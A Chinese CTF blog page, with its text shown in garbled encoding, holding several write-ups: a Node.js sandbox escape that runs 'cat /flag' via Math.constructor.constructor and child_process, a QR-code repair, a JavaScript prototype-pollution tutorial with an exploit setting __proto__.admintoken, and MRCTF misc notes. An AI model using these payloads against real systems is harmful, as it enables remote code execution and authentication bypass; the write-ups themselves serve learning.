<p>æˆ‘ä»¬å†å›åˆ°payloadæœ¬èº«<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°æœ€å¤–å±‚æ‹¬å·æ˜¯ä¸€ä¸ªé€—å·è¿ç®—ï¼Œè€Œé€—å·è¿ç®—æˆ‘ä»¬çŸ¥é“æ˜¯ä»å·¦å¾€å³è¿ç®—å†æœ€åè¿”å›æœ€å³è¾¹çš„å€¼ã€‚æˆ‘ä»¬ç”±æ­¤å¾—çŸ¥è¿™é‡Œæ˜¯æ‰§è¡Œè¿™ä¹ˆä¸ªè¿ç®—ï¼š</p>
<pre><code class="javascript">Math.constructor.constructor(.....)</code></pre>
<p>è€Œè¿™åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Œæˆ‘ä»¬ç›´æ¥é€å±‚æµ‹è¯•çš„<code>Math.constructor</code> ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425002236.png" alt="20200425002236"></p>
<p>å¯ä»¥è§åˆ°ç¬¬ä¸€å±‚è¿”å›çš„<code>function object()</code>,ä»–æ˜¯functionçš„å¯¹è±¡åŸå‹ï¼Œè€Œæˆ‘ä»¬çŸ¥é“Objectçš„æ„é€ å™¨æ˜¯æŒ‡å‘Functionçš„æ‰€ä»¥ç¬¬äºŒå±‚ä¼šå‡ºç°Functionã€‚è€ŒFunctionæ˜¯æ„é€ å‡½æ•°ä»–èƒ½å¤Ÿåˆ›å»ºå‡½æ•°ã€‚å¯ä»¥ç®€å•ç†è§£ä»–å’Œevalç±»ä¼¼ã€‚æˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="javascript">var sum = Math.constructor.constructor(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
sum(1,2);
var fun = new Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
fun(1,2)</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425003241.png" alt="20200425003241"></p>
<p>å¯ä»¥ç›´æ¥çœ‹åˆ°ç»“æœï¼Œ<code>Math.constructor.constructor()</code> å’Œæ„é€ å‡½æ•°<code>new Function()</code> æ˜¯ç­‰æ•ˆçš„ã€‚å½“ç„¶è¿™ä¸ªä¸çŸ¥åœ¨Mathä¸­å…¶ä»–ä»»æ„å‡½æ•°åº”è¯¥ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚ä¾‹å¦‚ï¼šalert()</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425003702.png" alt="20200425003702"></p>
<p>è€Œpayloadçš„æœ€é‡Œé¢<code>fromCharCode</code>å°±å¾ˆå®¹æ˜“ç†è§£äº†å°±æ˜¯æŠŠAIISCç è½¬æ¢ä¸ºå­—ç¬¦ä¸²,é‚£ä¹ˆç”Ÿæˆpayloadè„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code class="python">import re
encode = lambda code: list(map(ord,code))
decode = lambda code: &quot;&quot;.join(map(chr,code))
a=f&quot;&quot;&quot;
(m0=&gt;(
        m0=m0.constructor,
        m0.x=m0.constructor(
            m0.fromCharCode({encode(&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)&quot;)})
        )()
    ))(Math+1)
&quot;&quot;&quot;
a=re.sub(r&quot;[\s\[\]]&quot;, &quot;&quot;, a).replace(&quot;m0&quot;,&quot;Math&quot;)
print(a)
</code></pre>
<h3 id="æœ€ç»ˆEXP"><a href="#æœ€ç»ˆEXP" class="headerlink" title="æœ€ç»ˆEXP"></a>æœ€ç»ˆEXP</h3><pre><code class="python">import requests
import json
headers = {
    &quot;Content-Type&quot;:&quot;application/json&quot;
}
url = &quot;http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/&quot;
data = {&quot;e&quot;:&#39;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
r = requests.post(url,data=json.dumps(data),headers=headers)
print(r.text)</code></pre>
<p>GETFLAG:</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425004237.png" alt="20200425004237"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d44a4997a7.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d44a4997a7.html" class="post-title-link" itemprop="url">è®°ä¸€æ¬¡MISCäºŒç»´ç çš„ä¿®å¤</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-24 13:12:50" itemprop="dateCreated datePublished" datetime="2020-04-24T13:12:50+08:00">2020-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:26:31" itemprop="dateModified" datetime="2020-10-14T17:26:31+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>103</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>äºŒç»´ç æ˜¯ä¸ªä¸€åŠçš„äºŒç»´ç ã€‚</p>
<p><img src="https://goodcheerleung.gitee.io/blog/qrcode1.png" alt="qcode"></p>
<p>ç”¨qrazybox/è¿›è¡Œä¿®å¤ï¼ˆ<a href="https://merricx.github.io/qrazybox/ï¼‰å°±æ˜¯æŠŠäºŒç»´ç å…¨éƒ¨æ¶‚ä¸Šå»ï¼Œç„¶åTools" target="_blank" rel="noopener">https://merricx.github.io/qrazybox/ï¼‰å°±æ˜¯æŠŠäºŒç»´ç å…¨éƒ¨æ¶‚ä¸Šå»ï¼Œç„¶åTools</a> - Extract QR Information</p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200424130627.png" alt="2"></p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200424130839.png" alt="20200424130839.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3e8844c56.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d3e8844c56.html" class="post-title-link" itemprop="url">JavaScriptåŸå‹é“¾æ±¡æŸ“å­¦ä¹ ç¬”è®°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-24 10:46:55" itemprop="dateCreated datePublished" datetime="2020-04-24T10:46:55+08:00">2020-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:47:36" itemprop="dateModified" datetime="2020-10-14T17:47:36+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>2.5k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>2 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾</h2><p>â€‹        JavaScriptå¸¸è¢«ç§°ä¸ºåŸºäºåŸå‹çš„è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´jsä¸­æ²¡æœ‰ç±»ï¼Œåœ¨ç»§æ‰¿æ—¶å€™åªæœ‰ä¸€ç§ç»“æ„é‚£å°±æ˜¯å¯¹è±¡ï¼ˆ <strong>object</strong> ï¼‰ã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§é‚£å°±æ˜¯<code>__proto__</code>,è€Œ<code>__proto__</code>åˆä¼šæŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>prototype</strong> ï¼‰ä¸€ç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ä¸ºæ­¢ã€‚</p>
<p>â€‹        ç”¨ä¸€ä¸ªä¸æ˜¯å¾ˆæ°å½“çš„ä¾‹å­è¯´æ˜ï¼š</p>
<p>â€‹        é¸¡ç”Ÿè›‹ï¼Œå…¶ä¸­ç”Ÿè›‹è¿™ä¸ªè¿‡ç¨‹æˆ‘ä»¬ç§°ä¹‹ä¸º<strong>æ„é€ å‡½æ•°</strong>ï¼Œè€Œé¸¡æˆ‘ä»¬ç§°ä¸ºè›‹çš„<strong>åŸå‹</strong>ï¼Œè€Œè›‹å­µå‡ºçš„å°é¸¡åˆç”Ÿå°é¸¡ï¼Œé‚£ä¹ˆè›‹åˆæˆä¸ºäº†å°é¸¡çš„åŸå‹ã€‚</p>
<p>â€‹        æˆ‘ä»¬é€šè¿‡è›‹çš„DNAåˆå¯ä»¥æ‰¾åˆ°ç”Ÿä»–çš„æ¯é¸¡ï¼Œç”¨æ¯é¸¡çš„DNAåˆå¯æ‰¾åˆ°<code>ç”Ÿæ¯é¸¡çš„æ¯é¸¡</code>ï¼Œ<code>æ¯é¸¡çš„æ¯é¸¡</code>çš„DNAåˆå¯ä»¥æ‰¾åˆ°<code>ç”Ÿä»–æ¯é¸¡çš„æ¯é¸¡</code>è¿™ç§ç±»ä¼¼å®¶æ—çš„å…³ç³»æˆ‘ä»¬å°±ç§°ä¹‹ä¸º<strong>åŸå‹é“¾</strong>ã€‚</p>
<p>â€‹        åŸå‹é“¾å®ƒåˆä¸æ˜¯æ— é™çš„ï¼Œä½ åœ¨ä¸æ–­æœ”æºä»–çš„å®¶æ—æœ€ç»ˆä¼šå‘ç°ä»–çš„ç¥–å®—æ˜¯å®‡å®™å¤§çˆ†ç‚¸æ—¶å€™çš„å¥‡ç‚¹ï¼Œè€Œè¿™ä¸ªå¥‡ç‚¹ä¸æ˜¯é¸¡ä¹Ÿä¸æ˜¯è›‹ï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆæŒ‡å‘<code>null</code>.è€Œé¸¡æ˜¯ä¹Œé¸¡é‚£ä»–ç”Ÿçš„è›‹å­µå‡ºçš„å°é¸¡ä¹Ÿä¼šæ˜¯é»‘è‰²çš„ï¼Œè¿™æ ·çš„<code>é—ä¼ </code>å…³ç³»æˆ‘ä»¬ç§°ä¹‹ä¸º<strong>ç»§æ‰¿</strong>ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/blog/1.png" alt="img"></p>
<h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“</h2><p>â€‹        æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€æ®µä»£ç ,æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªç±»parentå†…æœ‰aã€bå±æ€§ï¼Œæˆ‘ä»¬ç»™parentè®¾ç½®ä¸€ä¸ªå±æ€§cèµ‹å€¼ä¸ºâ€˜3â€™ã€‚æˆ‘ä»¬å†è®¾ç½®ä¸€ä¸ªç±»childå†…æœ‰aã€bå±æ€§ï¼Œå¹¶è®©childçš„åŸå‹ä¸ºparentï¼Œæˆ‘ä»¬å®ä¾‹åŒ–ä¸€ä¸ªç±»childèµ‹ç»™sï¼Œè¾“å‡ºå¯¹è±¡sä¸­çš„cå±æ€§å‘ç°å…¶è¾“å‡ºäº†3ã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p><img src="http://goodcheerleung.gitee.io/blog/2.png" alt="img"></p>
<p>â€‹        è¦ç†è§£è¿™ç‚¹æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µå°±æ˜¯<strong>åŸå‹é“¾å˜é‡æœç´¢</strong>ï¼Œæˆ‘ä»¬è¦è¾“å‡ºä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§å¦‚æœåœ¨è¿™ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œå°±ä¼šåœ¨ä»–çš„ä¸Šå±‚åŸå‹ä¸­æœç´¢ï¼Œéå†å®Œè¿™æ¡åŸå‹é“¾ç›´åˆ°nullä¸ºæ­¢ã€‚æ‰€ä»¥è¿™æ¡åŸå‹é“¾å…¶å®æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/blog/3.png" alt="img"></p>
<p>â€‹        </p>
<p>â€‹        ä¸‹é¢æˆ‘ä»¬ä»¥ä¸€ä¸ªå®é™…æ¡ˆä¾‹æ¥è®²è§£åŸå‹é“¾æ±¡æŸ“,è¿™æ˜¯hackit 2018ä¸­çš„ä¸€é“åŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œä»¥ä¸‹æ˜¯æˆ‘æ‘˜è¦ä¸‹æ¥çš„ä»£ç ï¼ˆæ–‡æœ«å¥‰ä¸Šé“¾æ¥ï¼‰ï¼Œä»£ç ä¸­<code>user.admintoken</code>æ˜¯ä¸å­˜åœ¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆè®©<code>md5(user.admintoken) === req.query.querytoken</code>æ¡ä»¶æˆç«‹å‘¢ï¼Ÿ</p>
<pre><code class="javascript">var user=[];
app.get(&#39;/admin&#39;, (req, res) =&gt; { 
    /*this is under development I guess ??*/
    console.log(user.admintoken);
    if(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken){
        res.send(&#39;Hey admin your flag is &lt;b&gt;flag{prototype_pollution_is_very_dangerous}&lt;/b&gt;&#39;);
    } 
    else {
        res.status(403).send(&#39;Forbidden&#39;);
    }    
}
)
app.post(&#39;/api&#39;, (req, res) =&gt; {
    var client = req.body;
    var winner = null;
    matrix[client.row][client.col] = client.data;
    }</code></pre>
<p>â€‹        æˆ‘ä»¬å‘ç°<code>matrix[client.row][client.col] = client.data;</code>è¿›è¡Œäº†ä¸€ä¸ªèµ‹å€¼æ“ä½œï¼Œclientå¯¹è±¡æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œä¸Šé¢æˆ‘ä»¬è¯´äº†æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§<code>__proto__</code>,é‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½æ§åˆ¶<code>matrix</code>å¯¹è±¡çš„åŸå‹ä»è€Œæ§åˆ¶<code>user.admintoken</code>å‘¢ï¼Ÿ</p>
<p><img src="http://goodcheerleung.gitee.io/blog/4.png" alt="img"></p>
<p>â€‹        ä»ä¸Šæˆ‘ä»¬åœ¨æœ¬åœ°æµ‹è¯•çš„ç»“æœæ¥çœ‹æ˜¯å¯ä»¥æˆåŠŸæ§åˆ¶userçš„ã€‚è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“åŸå‹é“¾æ±¡æŸ“çš„æ¡ä»¶å°±æ˜¯è¦èƒ½å¤Ÿæ§åˆ¶é”®åã€‚</p>
<p>è€Œæœ€ç»ˆçš„expæ˜¯ï¼š</p>
<pre><code class="python">import requests
r = requests.post(&#39;http://target/api&#39;,json={&#39;row&#39;:&#39;__proto__&#39;,&#39;col&#39;:&#39;admintoken&#39;,&#39;data&#39;:&#39;qqq&#39;})
r = requests.get(&#39;http://target/admin?querytoken=&#39; + md5sumhex(&#39;qqq&#39;))
print r.text</code></pre>
<p>â€‹        æˆ‘ä»¬åœ¨æ¥çœ‹å¤§ä½¬ä»¬ä¸€ä¸ªç®€å•çš„ç±»ï¼Œè¿™ä¹Ÿæ˜¯å¤§ä½¬ä»¬ç»å¸¸ä¸¾çš„ä¾‹å­ï¼š</p>
<pre><code class="javascript">function merge(target, source) {
for (let key in source) {
    if (key in source &amp;&amp; key in target) {
        merge(target[key], source[key])
    } else {
        target[key] = source[key]
        }
    }
}</code></pre>
<p>â€‹        è¿™æ˜¯ä¸€ä¸ªå¯¹å¯¹è±¡è¿›è¡Œåˆå¹¶çš„ç±»æˆ‘ä»¬åœ¨æœ¬åœ°åšä¸ªå°å®éªŒçœ‹çœ‹èƒ½ä¸èƒ½è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é”®åæ˜¯å¯ä»¥è¢«æ§åˆ¶çš„ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/blog/5.png" alt="img"></p>
<p>â€‹        æˆ‘ä»¬å‘ç°åœ¨sä¸­æ²¡æœ‰bè¿™ä¸ªå±æ€§ï¼Ÿï¼Œæˆ‘ä»¬å°†test2çš„åŸå‹å’Œsçš„åŸå‹åˆ†åˆ«è¾“å‡ºæ¥ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/blog/6.png" alt="img"></p>
<p>â€‹        æˆ‘ä»¬å¯ä»¥å‘ç°sçš„åŸå‹ç›´æ¥æ˜¯objectæ‰€ä»¥åœ¨åŸå‹é“¾æœç´¢æ—¶å€™ç›´æ¥ä»object-&gt;nulläº†ã€‚è€Œtest2ä¸Šå±‚åŸå‹å´æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„å†ä¸Šå±‚æ‰æ˜¯objectã€‚è¿™æ˜¯å› ä¸ºåœ¨åˆ›å»ºå­—å…¸æ—¶å€™<code>__proto__</code>ä¸æ˜¯å½“åšé”®åå¤„ç†è€Œæ˜¯ä½œä¸º<code>__proto__</code>ç»™ä»–çš„çˆ¶ç±»è¿›è¡Œäº†èµ‹å€¼ï¼Œæ‰€ä»¥<code>test2.__proto__</code>ä¸­å­˜åœ¨bå±æ€§ã€‚é‚£ä¹ˆè¦æ€ä¹ˆæ ·æ‰èƒ½æˆåŠŸæ±¡æŸ“objectå‘¢ï¼Ÿæˆ‘ä»¬ç›´æ¥åœ¨å‰é¢åŠ ä¸€ä¸ªJSON.parseå³å¯ï¼ˆæŠŠä¸€ä¸ªjsonå­—ç¬¦ä¸² è½¬åŒ–ä¸º javascriptçš„objectï¼‰ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/blog/7.png" alt="img"></p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>â€‹        æœ¬äººæ°´å¹³æœ‰é™ï¼Œéš¾å…å‡ºç°çº°æ¼å’Œç†è§£é”™è¯¯çš„åœ°æ–¹ã€‚å¸Œæœ›å¤§ä½¬ä»¬èƒ½å¤Ÿæ‰¹è¯„æŒ‡å‡ºã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto</a>__</p>
<p><a href="https://www.anquanke.com/post/id/176884#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176884#h3-5</a></p>
<h2 id="èµ„æº"><a href="#èµ„æº" class="headerlink" title="èµ„æº"></a>èµ„æº</h2><p><strong>Republic_of_Gayming</strong>ï¼š<a href="https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming" target="_blank" rel="noopener">https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d430b53b04.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d430b53b04.html" class="post-title-link" itemprop="url">MISCä¸“é¡¹è®­ç»ƒç¬”è®°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-22 23:02:10" itemprop="dateCreated datePublished" datetime="2020-04-22T23:02:10+08:00">2020-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:14:09" itemprop="dateModified" datetime="2020-10-14T17:14:09+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.6k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="MRCTF2020-ä¸çœ ä¹‹å¤œ"><a href="#MRCTF2020-ä¸çœ ä¹‹å¤œ" class="headerlink" title="[MRCTF2020]ä¸çœ ä¹‹å¤œ"></a>[MRCTF2020]ä¸çœ ä¹‹å¤œ</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875492048718.png" alt="img"></p>
<p>ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„å›¾ç‰‡ã€‚ç›´æ¥ç”¨montageåˆæˆä¸€å¼ å›¾ã€‚</p>
<pre><code class="shell">montage *.jpg -geometry +0+0+0 ok.jpg</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875497047175.jpg" alt="img"></p>
<pre><code>gaps --image=ok.jpg --generations=50 --population=120 --size=50</code></pre><p>å‡ºæ¥flag</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875505799743.png" alt="img"></p>
<h2 id="MRCTF2020-ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"><a href="#MRCTF2020-ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—" class="headerlink" title="[MRCTF2020]ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"></a>[MRCTF2020]ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—</h2><p>å‹ç¼©åŒ…æ‰“å¼€å¤±è´¥â€¦äºæ˜¯çŒœæµ‹æ–‡ä»¶æŸåã€‚ç”¨010æ‰“å¼€ï¼Œdocxæ˜ å…¥çœ¼å¸˜ï¼ŒåŒæ—¶æ–‡ä»¶å¤´è¢«ä¿®æ”¹ï¼Œæ”¹å›æ¥RARå³å¯ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587550972340.png" alt="img"></p>
<p>ç”¨wordæ‰“å¼€æ˜¾ç¤ºéšè—æ–‡å­—å¾—åˆ°ï¼š</p>
<pre><code>â™­â™¯â™ªâ€–Â¶â™¬â™­â™­â™ªâ™­â€–â€–â™­â™­â™¬â€–â™«â™ªâ€–â™©â™¬â€–â™¬â™¬â™­â™­â™«â€–â™©â™«â€–â™¬â™ªâ™­â™­â™­â€–Â¶âˆ®â€–â€–â€–â€–â™©â™¬â€–â™¬â™ªâ€–â™©â™«â™­â™­â™­â™­â™­Â§â€–â™©â™©â™­â™­â™«â™­â™­â™­â€–â™¬â™­â€–Â¶Â§â™­â™­â™¯â€–â™«âˆ®â€–â™¬Â¶â€–Â¶âˆ®â€–â™¬â™«â€–â™«â™¬â€–â™«â™«Â§=</code></pre><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">åƒåƒå­—</a>ç§€è§£å¯†å¾—åˆ°ï¼š</p>
<pre><code>MRCTF{thEse_n0tes_ArE_am@zing~}</code></pre><h2 id="MRCTF2020-å¯»æ‰¾xxx"><a href="#MRCTF2020-å¯»æ‰¾xxx" class="headerlink" title="[MRCTF2020]å¯»æ‰¾xxx"></a>[MRCTF2020]å¯»æ‰¾xxx</h2><p>æ‰“å¼€ç”µè¯æ‹¨å·å£°ï¼Œä¸ç”¨æƒ³ç›´æ¥æ‰”<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf</a>è¯»å–å‡ºæ¥ï¼Œç„¶åæ‰‹åŠ¨å»é‡ï¼Œå› ä¸ºæœ‰å¹²æ‰°å£°ã€‚</p>
<p>18684221609</p>
<h2 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h2><p>binwalkåˆ†ç¦»å‡ºæ¥ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ã€‚çˆ†ç ´æ— æœã€‚</p>
